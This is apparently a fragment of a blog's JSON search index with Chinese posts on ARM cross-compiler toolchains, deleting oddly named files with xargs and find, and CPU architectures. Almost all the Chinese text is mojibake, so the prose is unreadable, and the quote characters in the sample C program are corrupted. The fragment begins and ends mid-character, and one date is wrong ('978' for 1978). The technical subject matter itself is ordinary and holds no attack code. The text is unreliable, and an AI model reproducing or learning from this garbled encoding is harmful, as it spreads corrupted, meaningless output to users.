ï¼Œè‡ªè¡Œç¼–è¯‘åˆ¶ä½œï¼‰ï¼Œç¬¬äºŒæ˜¯ Codesourceryï¼Œç¬¬ä¸‰æ˜¯Linoraã€‚\n\næ”¶è´¹ç‰ˆæœ‰ARMåŸå‚æä¾›çš„armccã€IARæä¾›çš„ç¼–è¯‘å™¨ç­‰ç­‰ï¼Œå› ä¸ºè¿™äº›ä»·æ ¼éƒ½æ¯”è¾ƒæ˜‚è´µï¼Œä¸é€‚åˆå­¦ä¹ ç”¨æˆ·ä½¿ç”¨ï¼Œæ‰€ä»¥ä¸åšè®²è¿°ã€‚\n\n\n\n+ arm-none-linux-gnueabi-gccï¼šæ˜¯ Codesourcery å…¬å¸ï¼ˆç›®å‰å·²ç»è¢«Mentoræ”¶è´­ï¼‰åŸºäºGCCæ¨å‡ºçš„çš„ARMäº¤å‰ç¼–è¯‘å·¥å…·ã€‚å¯ç”¨äºäº¤å‰ç¼–è¯‘ARMï¼ˆ32ä½ï¼‰ç³»ç»Ÿä¸­æ‰€æœ‰ç¯èŠ‚çš„ä»£ç ï¼ŒåŒ…æ‹¬è£¸æœºç¨‹åºã€u-bootã€Linux  kernelã€filesystemå’ŒAppåº”ç”¨ç¨‹åºã€‚\n\n+ arm-linux-gnueabihf-gccï¼šæ˜¯ç”± Linaro å…¬å¸åŸºäºGCCæ¨å‡ºçš„çš„ARMäº¤å‰ç¼–è¯‘å·¥å…·ã€‚å¯ç”¨äºäº¤å‰ç¼–è¯‘ARMï¼ˆ32ä½ï¼‰ç³»ç»Ÿä¸­æ‰€æœ‰ç¯èŠ‚çš„ä»£ç ï¼ŒåŒ…æ‹¬è£¸æœºç¨‹åºã€u-bootã€Linux kernelã€filesystemå’ŒAppåº”ç”¨ç¨‹åºã€‚\n\n+ aarch64-linux-gnu-gccï¼šæ˜¯ç”± Linaro å…¬å¸åŸºäºGCCæ¨å‡ºçš„çš„ARMäº¤å‰ç¼–è¯‘å·¥å…·ã€‚å¯ç”¨äºäº¤å‰ç¼–è¯‘ARMv8 64ä½ç›®æ ‡ä¸­çš„è£¸æœºç¨‹åºã€u-bootã€Linux  kernelã€filesystemå’ŒAppåº”ç”¨ç¨‹åºã€‚\n\n+ arm-none-elf-gccï¼šæ˜¯ Codesourcery å…¬å¸ï¼ˆç›®å‰å·²ç»è¢«Mentoræ”¶è´­ï¼‰åŸºäºGCCæ¨å‡ºçš„çš„ARMäº¤å‰ç¼–è¯‘å·¥å…·ã€‚å¯ç”¨äºäº¤å‰ç¼–è¯‘ARM MCUï¼ˆ32ä½ï¼‰èŠ¯ç‰‡ï¼Œå¦‚ARM7ã€ARM9ã€Cortex-M/RèŠ¯ç‰‡ç¨‹åºã€‚\n\n+ arm-none-eabi-gccï¼šæ˜¯ GNU æ¨å‡ºçš„çš„ARMäº¤å‰ç¼–è¯‘å·¥å…·ã€‚å¯ç”¨äºäº¤å‰ç¼–è¯‘ARM MCUï¼ˆ32ä½ï¼‰èŠ¯ç‰‡ï¼Œå¦‚ARM7ã€ARM9ã€Cortex-M/RèŠ¯ç‰‡ç¨‹åºã€‚\n\n\n\n## äº¤å‰ç¼–è¯‘å™¨ä¸‹è½½\n\n- arm-none-linux-gnueabi-gccä¸‹è½½ï¼š<http://www.veryarm.com/arm-none-linux-gnueabi-gcc>\n- arm-linux-gnueabihf-gccä¸‹è½½ï¼š<http://www.veryarm.com/arm-linux-gnueabihf-gcc>\n- aarch64-linux-gnu-gccä¸‹è½½ï¼š<http://www.veryarm.com/aarch64-linux-gnu-gcc>\n- arm-none-elf-gccä¸‹è½½ï¼š<http://www.veryarm.com/arm-none-elf-gcc>\n- arm-none-eabi-gccä¸‹è½½ï¼š<http://www.veryarm.com/arm-none-eabi-gcc>\n\n ä»¥ä¸Šåœ°å€éƒ½æ˜¯ç›´æ¥ä»å®˜ç½‘è½¬å­˜åˆ°ç™¾åº¦äº‘ç›˜ï¼Œä»…ä¸ºæ–¹ä¾¿å›½å†…ç”¨æˆ·ä¸‹è½½ä½¿ç”¨ï¼Œå¹¶éæœ¬ç«™åˆ¶ä½œï¼Œè¯·å‹¿ç”¨äºå•†ä¸šæˆ–è€…éæ³•ç”¨é€”ã€‚å› ä¸ºç‰ˆæœ¬å¤šéš¾ä»¥é€‰æ‹©ï¼Œæ‰€ä»¥æˆ‘ä»¬å»ºè®®æ‚¨ä½¿ç”¨è¯¥ç±»ç¼–è¯‘å™¨çš„æœ€æ–°ç‰ˆæœ¬ã€‚\n\n\n\n## å‘½åè§„åˆ™\n\näº¤å‰ç¼–è¯‘å·¥å…·é“¾çš„å‘½åè§„åˆ™ä¸ºï¼š`arch [-vendor][-os] [-(gnu)eabi]`\n\n- **arch** - ä½“ç³»æ¶æ„ï¼Œå¦‚ARMï¼ŒMIPS\n- **vendor** - å·¥å…·é“¾æä¾›å•†\n- **os** - ç›®æ ‡æ“ä½œç³»ç»Ÿ\n- **eabi** - åµŒå…¥å¼åº”ç”¨äºŒè¿›åˆ¶æ¥å£ï¼ˆEmbedded Application Binary Interfaceï¼‰\n\næ ¹æ®å¯¹æ“ä½œç³»ç»Ÿçš„æ”¯æŒä¸å¦ï¼ŒARM GCCå¯åˆ†ä¸ºæ”¯æŒå’Œä¸æ”¯æŒæ“ä½œç³»ç»Ÿï¼Œå¦‚\n\n- **arm-none-eabi**ï¼šè¿™ä¸ªæ˜¯æ²¡æœ‰æ“ä½œç³»ç»Ÿçš„ï¼Œè‡ªç„¶ä¸å¯èƒ½æ”¯æŒé‚£äº›è·Ÿæ“ä½œç³»ç»Ÿå…³ç³»å¯†åˆ‡çš„å‡½æ•°ï¼Œæ¯”å¦‚fork(2)ã€‚ä»–ä½¿ç”¨çš„æ˜¯newlibè¿™ä¸ªä¸“ç”¨äºåµŒå…¥å¼ç³»ç»Ÿçš„Cåº“ã€‚\n- **arm-none-linux-eabi**ï¼šç”¨äºLinuxçš„ï¼Œä½¿ç”¨Glibc\n\n\n\n##  å®ä¾‹\n\n#### 1ã€arm-none-eabi-gcc\n\nï¼ˆARM architectureï¼Œno vendorï¼Œnot target an operating systemï¼Œcomplies with the ARM EABIï¼‰\nç”¨äºç¼–è¯‘ ARM æ¶æ„çš„è£¸æœºç³»ç»Ÿï¼ˆåŒ…æ‹¬ ARM Linux çš„ bootã€kernelï¼Œä¸é€‚ç”¨ç¼–è¯‘ Linux åº”ç”¨ Applicationï¼‰ï¼Œä¸€èˆ¬é€‚åˆ ARM7ã€Cortex-M å’Œ Cortex-R å†…æ ¸çš„èŠ¯ç‰‡ä½¿ç”¨ï¼Œæ‰€ä»¥ä¸æ”¯æŒé‚£äº›è·Ÿæ“ä½œç³»ç»Ÿå…³ç³»å¯†åˆ‡çš„å‡½æ•°ï¼Œæ¯”å¦‚fork(2)ï¼Œä»–ä½¿ç”¨çš„æ˜¯ newlib è¿™ä¸ªä¸“ç”¨äºåµŒå…¥å¼ç³»ç»Ÿçš„Cåº“ã€‚\n\n#### 2ã€arm-none-linux-gnueabi-gcc  //å¸¸ç”¨çš„\n\n(ARM architecture, no vendor, creates binaries that run on the **Linux** operating system, and uses the GNU EABI)\n\nä¸»è¦ç”¨äºåŸºäºARMæ¶æ„çš„Linuxç³»ç»Ÿï¼Œå¯ç”¨äºç¼–è¯‘ ARM æ¶æ„çš„ u-bootã€Linuxå†…æ ¸ã€linuxåº”ç”¨ç­‰ã€‚arm-none-linux-gnueabiåŸºäºGCCï¼Œä½¿ç”¨Glibcåº“ï¼Œç»è¿‡ `Codesourcery` å…¬å¸ä¼˜åŒ–è¿‡æ¨å‡ºçš„ç¼–è¯‘å™¨ã€‚arm-none-linux-gnueabi-xxx äº¤å‰ç¼–è¯‘å·¥å…·çš„æµ®ç‚¹è¿ç®—éå¸¸ä¼˜ç§€ã€‚ä¸€èˆ¬ARM9ã€ARM11ã€Cortex-A å†…æ ¸ï¼Œå¸¦æœ‰ Linux æ“ä½œç³»ç»Ÿçš„ä¼šç”¨åˆ°ã€‚\n\n#### 3ã€arm-eabi-gcc\n\nAndroid ARM ç¼–è¯‘å™¨ã€‚\n\n#### 4ã€armcc\n\nARM å…¬å¸æ¨å‡ºçš„ç¼–è¯‘å·¥å…·ï¼ŒåŠŸèƒ½å’Œ arm-none-eabi ç±»ä¼¼ï¼Œå¯ä»¥ç¼–è¯‘è£¸æœºç¨‹åºï¼ˆu-bootã€kernelï¼‰ï¼Œä½†æ˜¯ä¸èƒ½ç¼–è¯‘ Linux åº”ç”¨ç¨‹åºã€‚armccä¸€èˆ¬å’ŒARMå¼€å‘å·¥å…·ä¸€èµ·ï¼ŒKeil MDKã€ADSã€RVDSå’ŒDS-5ä¸­çš„ç¼–è¯‘å™¨éƒ½æ˜¯armccï¼Œæ‰€ä»¥ armcc ç¼–è¯‘å™¨éƒ½æ˜¯æ”¶è´¹çš„ï¼ˆçˆ±å›½ç‰ˆé™¤å¤–ï¼Œå‘µå‘µ~~ï¼‰ã€‚\n\n#### 5ã€arm-none-uclinuxeabi-gcc å’Œ arm-none-symbianelf-gcc\n\narm-none-uclinuxeabi ç”¨äº**uCLinux**ï¼Œä½¿ç”¨Glibcã€‚\n\narm-none-symbianelf ç”¨äº**symbian**ï¼Œæ²¡ç”¨è¿‡ï¼Œä¸çŸ¥é“Cåº“æ˜¯ä»€ä¹ˆ ã€‚\n\n\n\n## ABI å’Œ EABI\n\n**ABI**ï¼šäºŒè¿›åˆ¶åº”ç”¨ç¨‹åºæ¥å£(Application Binary Interface (ABI) for the ARM Architecture)ã€‚åœ¨è®¡ç®—æœºä¸­ï¼Œåº”ç”¨äºŒè¿›åˆ¶æ¥å£æè¿°äº†åº”ç”¨ç¨‹åºï¼ˆæˆ–è€…å…¶ä»–ç±»å‹ï¼‰å’Œæ“ä½œç³»ç»Ÿä¹‹é—´æˆ–å…¶ä»–åº”ç”¨ç¨‹åºçš„ä½çº§æ¥å£ã€‚\n\n**EABI**ï¼šåµŒå…¥å¼ABIã€‚åµŒå…¥å¼åº”ç”¨äºŒè¿›åˆ¶æ¥å£æŒ‡å®šäº†æ–‡ä»¶æ ¼å¼ã€æ•°æ®ç±»å‹ã€å¯„å­˜å™¨ä½¿ç”¨ã€å †ç§¯ç»„ç»‡ä¼˜åŒ–å’Œåœ¨ä¸€ä¸ªåµŒå…¥å¼è½¯ä»¶ä¸­çš„å‚æ•°çš„æ ‡å‡†çº¦å®šã€‚å¼€å‘è€…ä½¿ç”¨è‡ªå·±çš„æ±‡ç¼–è¯­è¨€ä¹Ÿå¯ä»¥ä½¿ç”¨ EABI ä½œä¸ºä¸å…¼å®¹çš„ç¼–è¯‘å™¨ç”Ÿæˆçš„æ±‡ç¼–è¯­è¨€çš„æ¥å£ã€‚\n\nä¸¤è€…ä¸»è¦åŒºåˆ«æ˜¯ï¼ŒABIæ˜¯è®¡ç®—æœºä¸Šçš„ï¼ŒEABIæ˜¯åµŒå…¥å¼å¹³å°ä¸Šï¼ˆå¦‚ARMï¼ŒMIPSç­‰ï¼‰ã€‚\n\n\n\n## Codesourceryå…¬å¸\n\nCodesourceryæ¨å‡ºçš„äº§å“å«Sourcery G++ Lite Editionï¼Œå…¶ä¸­åŸºäºcommand-lineçš„ç¼–è¯‘å™¨æ˜¯å…è´¹çš„ï¼Œåœ¨å®˜ç½‘ä¸Šå¯ä»¥ä¸‹è½½ï¼Œè€Œå…¶ä¸­åŒ…å«çš„IDEå’Œdebug å·¥å…·æ˜¯æ”¶è´¹çš„ï¼Œå½“ç„¶ä¹Ÿæœ‰30å¤©è¯•ç”¨ç‰ˆæœ¬çš„ã€‚\n\nç›®å‰CodeSourceryå·²ç»ç”±æ˜å¯¼å›½é™…(Mentor Graphics)æ”¶è´­ï¼Œæ‰€ä»¥åŸæœ¬çš„ç½‘ç«™é£æ ¼å·²ç»å…¨éƒ¨å˜ä¸º Mentor æ ·å¼ï¼Œä½†æ˜¯ Sourcery G++ Lite Edition åŒæ ·å¯ä»¥æ³¨å†Œåå…è´¹ä¸‹è½½ã€‚\n\nCodesourceryä¸€ç›´æ˜¯åœ¨åšARMç›®æ ‡ GCC çš„å¼€å‘å’Œä¼˜åŒ–ï¼Œå®ƒçš„ARM GCCåœ¨ç›®å‰åœ¨å¸‚åœºä¸Šéå¸¸ä¼˜ç§€ï¼Œå¾ˆå¤š patch å¯èƒ½è¿˜æ²¡è¢«gccæ¥å—ï¼Œæ‰€ä»¥è¿˜æ˜¯åº”è¯¥ç›´æ¥ç”¨å®ƒçš„ã€‚\n\nè€Œä¸”ä»–æä¾›Windowsä¸‹[mingwäº¤å‰ç¼–è¯‘çš„]å’ŒLinuxä¸‹çš„äºŒè¿›åˆ¶ç‰ˆæœ¬ï¼Œæ¯”è¾ƒæ–¹ä¾¿ï¼›å¦‚æœä¸æ˜¯å¾ˆæœ‰æ—¶é—´å’Œå…´è¶£ï¼Œä¸å»ºè®®ä¸‹è½½ src æºç åŒ…è‡ªå·±ç¼–è¯‘ï¼Œå¾ˆéº»çƒ¦ï¼ŒCodesourceryç»™çš„shellè„šæœ¬å¾ˆå¤šæ—¶å€™æ ¹æœ¬æ²¡åŠæ³•ç›´æ¥ç”¨ï¼Œå¾—è‡ªè¡Œæå–å…³é”®çš„éƒ¨åˆ†æ‰‹å·¥æ‰§è¡Œï¼Œåˆè´¹ç²¾åŠ›åˆè´¹æ—¶é—´ï¼Œå¦‚æœæƒ³çŸ¥é“ç»†èŠ‚ï¼Œå…¶å®ä¸ç”¨è‡ªå·±ç¼–è¯‘ä¸€éï¼Œçœ‹çœ‹ä»–æ˜¯ç”¨ä»€ä¹ˆæ­¥éª¤æ„å»ºçš„å³å¯ï¼Œå¦‚æœä½ å¯¹äº¤å‰ç¼–è¯‘å™¨æ„Ÿå…´è¶£çš„è¯ã€‚\n\n\n\n## arm-linux-gnueabi-gcc å’Œ arm-linux-gnueabihf-gcc\n\nä¸¤ä¸ªäº¤å‰ç¼–è¯‘å™¨åˆ†åˆ«é€‚ç”¨äº armel å’Œ armhf ä¸¤ä¸ªä¸åŒçš„æ¶æ„ï¼Œarmel å’Œ armhf è¿™ä¸¤ç§æ¶æ„åœ¨å¯¹å¾…æµ®ç‚¹è¿ç®—é‡‡å–äº†ä¸åŒçš„ç­–ç•¥ï¼ˆæœ‰ fpu çš„ arm æ‰èƒ½æ”¯æŒè¿™ä¸¤ç§æµ®ç‚¹è¿ç®—ç­–ç•¥ï¼‰ã€‚\n\nå…¶å®è¿™ä¸¤ä¸ªäº¤å‰ç¼–è¯‘å™¨åªä¸è¿‡æ˜¯ gcc çš„é€‰é¡¹ -mfloat-abi çš„é»˜è®¤å€¼ä¸åŒã€‚gcc çš„é€‰é¡¹ -mfloat-abi æœ‰ä¸‰ç§å€¼ **softã€softfpã€hard**ï¼ˆå…¶ä¸­åä¸¤è€…éƒ½è¦æ±‚ arm é‡Œæœ‰ fpu æµ®ç‚¹è¿ç®—å•å…ƒï¼Œsoft ä¸åä¸¤è€…æ˜¯å…¼å®¹çš„ï¼Œä½† softfp å’Œ hard ä¸¤ç§æ¨¡å¼äº’ä¸å…¼å®¹ï¼‰ï¼š\n**softï¼š** ä¸ç”¨fpuè¿›è¡Œæµ®ç‚¹è®¡ç®—ï¼Œå³ä½¿æœ‰fpuæµ®ç‚¹è¿ç®—å•å…ƒä¹Ÿä¸ç”¨ï¼Œè€Œæ˜¯ä½¿ç”¨è½¯ä»¶æ¨¡å¼ã€‚\n**softfpï¼š** armelæ¶æ„ï¼ˆå¯¹åº”çš„ç¼–è¯‘å™¨ä¸º arm-linux-gnueabi-gcc ï¼‰é‡‡ç”¨çš„é»˜è®¤å€¼ï¼Œç”¨fpuè®¡ç®—ï¼Œä½†æ˜¯ä¼ å‚æ•°ç”¨æ™®é€šå¯„å­˜å™¨ä¼ ï¼Œè¿™æ ·ä¸­æ–­çš„æ—¶å€™ï¼Œåªéœ€è¦ä¿å­˜æ™®é€šå¯„å­˜å™¨ï¼Œä¸­æ–­è´Ÿè·å°ï¼Œä½†æ˜¯å‚æ•°éœ€è¦è½¬æ¢æˆæµ®ç‚¹çš„å†è®¡ç®—ã€‚\n**hardï¼š** armhfæ¶æ„ï¼ˆå¯¹åº”çš„ç¼–è¯‘å™¨ arm-linux-gnueabihf-gcc ï¼‰é‡‡ç”¨çš„é»˜è®¤å€¼ï¼Œç”¨fpuè®¡ç®—ï¼Œä¼ å‚æ•°ä¹Ÿç”¨fpuä¸­çš„æµ®ç‚¹å¯„å­˜å™¨ä¼ ï¼Œçœå»äº†è½¬æ¢ï¼Œæ€§èƒ½æœ€å¥½ï¼Œä½†æ˜¯ä¸­æ–­è´Ÿè·é«˜ã€‚\n\n\n\næŠŠä»¥ä¸‹æµ‹è¯•ä½¿ç”¨çš„Cæ–‡ä»¶å†…å®¹ä¿å­˜æˆ mfloat.cï¼š\n\n```c\n#include <stdio.h>\nint main(void)\n{\n    double a,b,c;\n    a = 23.543;\n    b = 323.234;\n    c = b/a;\n    printf(â€œthe 13/2 = %f\\nâ€, c);\n    printf(â€œhello world !\\nâ€);\n    return 0;\n}\n```\n\n\n\n**1ã€ä½¿ç”¨ arm-linux-gnueabihf-gcc ç¼–è¯‘ï¼Œä½¿ç”¨â€œ-vâ€é€‰é¡¹ä»¥è·å–æ›´è¯¦ç»†çš„ä¿¡æ¯ï¼š**\n\\# arm-linux-gnueabihf-gcc -v mfloat.c\nCOLLECT_GCC_OPTIONS=â€™-vâ€™ â€˜-march=armv7-aâ€™ â€˜-mfloat-abi=hardâ€™ â€˜-mfpu=vfpv3-d16â€² â€˜-mthumbâ€™\n-mfloat-abi=hard\n\nå¯çœ‹å‡ºä½¿ç”¨hardç¡¬ä»¶æµ®ç‚¹æ¨¡å¼ã€‚\n\n**2ã€ä½¿ç”¨ arm-linux-gnueabi-gcc ç¼–è¯‘ï¼š**\n\\# arm-linux-gnueabi-gcc -v mfloat.c\nCOLLECT_GCC_OPTIONS=â€™-vâ€™ â€˜-march=armv7-aâ€™ â€˜-mfloat-abi=softfpâ€™ â€˜-mfpu=vfpv3-d16â€² â€˜-mthumbâ€™\n-mfloat-abi=softfp\n\nå¯çœ‹å‡ºä½¿ç”¨softfpæ¨¡å¼ã€‚","tags":["arm"],"categories":["ç³»ç»Ÿ"]},{"title":"ä½¿ç”¨ç®¡é“åˆ é™¤ä¸è§„åˆ™æ–‡ä»¶","url":"%2Fp%2Fa7ad4d37.html","content":"\n\n### 1. ä½¿ç”¨ xargs rm \n\n```\nls | grep abcd | rm  //é”™è¯¯ç”¨æ³•\n```\n\n\n\nrm doesn't accept input from `stdin`. You'll need to do something like\n\n```\nls | grep abcd | xargs rm\n```\n\nä½†æ˜¯é‡åˆ°ä¸è§„åˆ™ç¬¦å·çš„æ–‡ä»¶æœ‰å¯èƒ½åˆ é™¤ä¸äº†.\n\n\n\n### 2. ä½¿ç”¨ find exec\n\nå¯ä»¥åˆ é™¤ä¸è§„åˆ™ç¬¦å·æ–‡ä»¶:\n```\nfind . -name \"*td*\" -exec rm -f {} \\;\n```\n\n","tags":["linux"],"categories":["ç³»ç»Ÿ"]},{"title":"æ·±å…¥äº†è§£CPUæ¶æ„","url":"%2Fp%2F690c18bd.html","content":"\n\n\n## 1. CPUæ˜¯ä»€ä¹ˆ\n\nä¸­å¤®å¤„ç†å•å…ƒï¼ˆCPUï¼‰ä¸»è¦ç”±è¿ç®—å™¨ã€æ§åˆ¶å™¨ã€å¯„å­˜å™¨ä¸‰éƒ¨åˆ†ç»„æˆï¼Œä»å­—é¢æ„æ€çœ‹è¿ç®—å™¨å°±æ˜¯èµ·ç€è¿ç®—çš„ä½œç”¨ï¼Œæ§åˆ¶å™¨å°±æ˜¯è´Ÿè´£å‘å‡ºCPUæ¯æ¡æŒ‡ä»¤æ‰€éœ€è¦çš„ä¿¡æ¯ï¼Œå¯„å­˜å™¨å°±æ˜¯ä¿å­˜è¿ç®—æˆ–è€…æŒ‡ä»¤çš„ä¸€äº›ä¸´æ—¶æ–‡ä»¶ï¼Œè¿™æ ·å¯ä»¥ä¿è¯æ›´é«˜çš„é€Ÿåº¦ã€‚  \n\n\n\nCPUæœ‰ç€å¤„ç†æŒ‡ä»¤ã€æ‰§è¡Œæ“ä½œã€æ§åˆ¶æ—¶é—´ã€å¤„ç†æ•°æ®å››å¤§ä½œç”¨ï¼Œæ‰“ä¸ªæ¯”å–»æ¥è¯´ï¼ŒCPUå°±åƒæˆ‘ä»¬çš„å¤§è„‘ï¼Œå¸®æˆ‘ä»¬å®Œæˆå„ç§å„æ ·çš„ç”Ÿç†æ´»åŠ¨ã€‚å› æ­¤å¦‚æœæ²¡æœ‰CPUï¼Œé‚£ä¹ˆç”µè„‘å°±æ˜¯ä¸€å †åºŸç‰©ï¼Œæ— æ³•å·¥ä½œã€‚ç§»åŠ¨è®¾å¤‡å…¶å®å¾ˆå¤æ‚ï¼Œè¿™äº›CPUéœ€è¦æ‰§è¡Œæ•°ä»¥ç™¾ä¸‡è®¡çš„æŒ‡ç¤ºï¼Œæ‰èƒ½ä½¿å®ƒå‘æˆ‘ä»¬æœŸå¾…çš„æ–¹å‘è¿è¡Œï¼Œè€ŒCPUçš„é€Ÿåº¦å’ŒåŠŸç‡æ•ˆç‡æ˜¯è‡³å…³é‡è¦çš„ã€‚é€Ÿåº¦å½±å“ç”¨æˆ·ä½“éªŒï¼Œè€Œæ•ˆç‡å½±å“ç”µæ± å¯¿å‘½ã€‚æœ€å®Œç¾çš„ç§»åŠ¨è®¾å¤‡æ˜¯é«˜æ€§èƒ½å’Œä½åŠŸè€—ç›¸ç»“åˆã€‚ \n\n\n\n## 2. CPUçš„æ¶æ„\n\nä»CPUå‘æ˜åˆ°ç°åœ¨ï¼Œæœ‰éå¸¸å¤šç§æ¶æ„ï¼Œä»æˆ‘ä»¬ç†Ÿæ‚‰çš„X86ï¼ŒARMï¼Œåˆ°ä¸å¤ªç†Ÿæ‚‰çš„MIPSï¼ŒIA64ï¼Œå®ƒä»¬ä¹‹é—´çš„å·®è·éƒ½éå¸¸å¤§ã€‚ä½†æ˜¯å¦‚æœä»æœ€åŸºæœ¬çš„é€»è¾‘è§’åº¦æ¥åˆ†ç±»çš„è¯ï¼Œå®ƒä»¬å¯ä»¥è¢«åˆ†ä¸ºä¸¤å¤§ç±»ï¼Œå³æ‰€è°“çš„â€œå¤æ‚æŒ‡ä»¤é›†â€ä¸â€œç²¾ç®€æŒ‡ä»¤é›†â€ç³»ç»Ÿï¼Œä¹Ÿå°±æ˜¯ç»å¸¸çœ‹åˆ°çš„â€œCISCâ€ä¸â€œRISCâ€ã€‚\n\n\n\n Intelå’ŒARMå¤„ç†å™¨çš„ç¬¬ä¸€ä¸ªåŒºåˆ«æ˜¯ï¼Œå‰è€…ä½¿ç”¨å¤æ‚æŒ‡ä»¤é›†ï¼ˆCISC)ï¼Œè€Œåè€…ä½¿ç”¨ç²¾ç®€æŒ‡ä»¤é›†ï¼ˆRISCï¼‰ã€‚å±äºè¿™ä¸¤ç§ç±»ä¸­çš„å„ç§æ¶æ„ä¹‹é—´æœ€å¤§çš„åŒºåˆ«ï¼Œåœ¨äºå®ƒä»¬çš„è®¾è®¡è€…è€ƒè™‘é—®é¢˜æ–¹å¼çš„ä¸åŒã€‚\n\n\n\næˆ‘ä»¬å¯ä»¥ç»§ç»­ä¸¾ä¸ªä¾‹å­ï¼Œæ¯”å¦‚è¯´æˆ‘ä»¬è¦å‘½ä»¤ä¸€ä¸ªäººåƒé¥­ï¼Œé‚£ä¹ˆæˆ‘ä»¬åº”è¯¥æ€ä¹ˆå‘½ä»¤å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥ç›´æ¥å¯¹ä»–ä¸‹è¾¾â€œåƒé¥­â€çš„å‘½ä»¤ï¼Œä¹Ÿå¯ä»¥å‘½ä»¤ä»–â€œå…ˆæ‹¿å‹ºå­ï¼Œç„¶åèˆ€èµ·ä¸€å‹ºé¥­ï¼Œç„¶åå¼ å˜´ï¼Œç„¶åé€åˆ°å˜´é‡Œï¼Œæœ€åå’½ä¸‹å»â€ã€‚ä»è¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œå¯¹äºå‘½ä»¤åˆ«äººåšäº‹è¿™æ ·ä¸€ä»¶äº‹æƒ…ï¼Œä¸åŒçš„äººæœ‰ä¸åŒçš„ç†è§£ï¼Œæœ‰äººè®¤ä¸ºï¼Œå¦‚æœæˆ‘é¦–å…ˆç»™æ¥å—å‘½ä»¤çš„äººä»¥è¶³å¤Ÿçš„è®­ç»ƒï¼Œè®©ä»–æŒæ¡å„ç§å¤æ‚æŠ€èƒ½ï¼ˆå³åœ¨ç¡¬ä»¶ä¸­å®ç°å¯¹åº”çš„å¤æ‚åŠŸèƒ½ï¼‰ï¼Œé‚£ä¹ˆä»¥åå°±å¯ä»¥ç”¨éå¸¸ç®€å•çš„å‘½ä»¤è®©ä»–å»åšå¾ˆå¤æ‚çš„äº‹æƒ…â€”â€”æ¯”å¦‚åªè¦è¯´ä¸€å¥â€œåƒé¥­â€ï¼Œä»–å°±ä¼šåƒé¥­ã€‚ä½†æ˜¯ä¹Ÿæœ‰äººè®¤ä¸ºè¿™æ ·ä¼šè®©äº‹æƒ…å˜çš„å¤ªå¤æ‚ï¼Œæ¯•ç«Ÿæ¥å—å‘½ä»¤çš„äººè¦åšçš„äº‹æƒ…å¾ˆå¤æ‚ï¼Œå¦‚æœä½ è¿™æ—¶å€™æƒ³è®©ä»–åƒèœæ€ä¹ˆåŠï¼Ÿéš¾é“ç»§ç»­è®­ç»ƒä»–åƒèœçš„æ–¹æ³•ï¼Ÿæˆ‘ä»¬ä¸ºä»€ä¹ˆä¸å¯ä»¥æŠŠäº‹æƒ…åˆ†ä¸ºè®¸å¤šéå¸¸åŸºæœ¬çš„æ­¥éª¤ï¼Œè¿™æ ·åªéœ€è¦æ¥å—å‘½ä»¤çš„äººæ‡‚å¾—å¾ˆå°‘çš„åŸºæœ¬æŠ€èƒ½ï¼Œå°±å¯ä»¥å®ŒæˆåŒæ ·çš„å·¥ä½œï¼Œæ— éæ˜¯ä¸‹è¾¾å‘½ä»¤çš„äººç¨å¾®ç´¯ä¸€ç‚¹â€”â€”æ¯”å¦‚ç°åœ¨æˆ‘è¦ä»–åƒèœï¼Œåªéœ€è¦æŠŠåˆšåˆšåƒé¥­å‘½ä»¤é‡Œçš„â€œèˆ€èµ·ä¸€å‹ºé¥­â€æ”¹æˆâ€œèˆ€èµ·ä¸€å‹ºèœâ€ï¼Œé—®é¢˜å°±è§£å†³äº†ï¼Œå¤šä¹ˆç®€å•ã€‚è¿™å°±æ˜¯â€œå¤æ‚æŒ‡ä»¤é›†â€å’Œâ€œç²¾ç®€æŒ‡ä»¤é›†â€çš„é€»è¾‘åŒºåˆ«ã€‚\n\n<!-- more -->\n\n\n\n## 3. CPUå¸¸è§æ¶æ„\n\n##### X86\n\n978å¹´6æœˆ8æ—¥ï¼ŒIntelå‘å¸ƒäº†å²è¯—çº§çš„CPUå¤„ç†å™¨8086ï¼Œç”±æ­¤X86æ¶æ„ä¼ å¥‡æ­£å¼æ‹‰å¼€å¸·å¹•ã€‚é¦–æ¬¡ä¸º8086å¼•å…¥X86ä½œä¸ºè®¡ç®—æœºè¯­è¨€çš„æŒ‡ä»¤é›†ï¼Œå®šä¹‰äº†ä¸€äº›åŸºæœ¬ä½¿ç”¨è§„åˆ™ï¼ŒX86æ¶æ„ä½¿ç”¨çš„æ˜¯CISCå¤æ‚æŒ‡ä»¤é›†ã€‚åŒæ—¶8086å¤„ç†å™¨çš„å¤§è·æˆåŠŸä¹Ÿç›´æ¥è®©Intelæˆä¸ºäº†CPUå·¨å¤´.\n\n##### IA64ï¼ˆIntel Architecture 64ï¼Œè‹±ç‰¹å°”æ¶æ„64ï¼‰\n\nå“‡ï¼ŒIA64å¬èµ·æ¥å¥½é™Œç”Ÿï¼Œæ˜¯çš„ï¼Œè™½ç„¶åŒå‡ºIntelä¹‹æ‰‹ã€‚ä½†è¿™å¯ä»¥è¯´æ˜¯å¤±è´¥å“ã€‚å½“å¹´X86è¿‡æ¸¡åˆ°64ä½æŒ‡ä»¤é›†æ—¶ï¼Œä¸€ä¸ªä¸å°å¿ƒè¢«AMDå¼¯é“è¶…è½¦ï¼Œæœ€ååªèƒ½è”åˆæƒ æ™®æ¨å‡ºäº†å±äºè‡ªå·±çš„IA64æŒ‡ä»¤é›†ï¼Œä½†è¿™ä¹Ÿä»…é™äºæœåŠ¡å™¨ä¸Šï¼Œä¹Ÿæ˜¯Itaniumå®‰è…¾å¤„ç†å™¨çš„æ¥å†ï¼ˆç°åœ¨å·²ç»å‡‰äº†ï¼‰\n\nè‡³äºIA64ç©¶ç«Ÿæ˜¯RISCè¿˜æ˜¯CISCæŒ‡ä»¤é›†çš„å»¶ç»­ï¼Œè¿™ä¸ªçœŸçš„å¾ˆéš¾è¯´æ¸…æ¥šï¼Œä½†å•çº¯ä»¥IA64åŸºäºHPçš„EPICï¼ˆExplicitly Parallel Instruction Computersï¼Œç²¾ç¡®å¹¶è¡ŒæŒ‡ä»¤è®¡ç®—æœºï¼‰æ¥çœ‹ï¼Œä¼¼ä¹æ›´åå‘äºRISCä½“ç³»ã€‚\n\n##### MIPSï¼ˆMicroprocessor without interlockedpipedstagesï¼Œæ— å†…éƒ¨äº’é”æµæ°´çº§çš„å¾®å¤„ç†å™¨ï¼‰\n\nåœ¨ä¸Šä¸–çºª80å¹´ä»£ç”±ç¾å›½æ–¯å¦ç¦å¤§å­¦Hennessyæ•™æˆçš„ç ”ç©¶å°ç»„ç 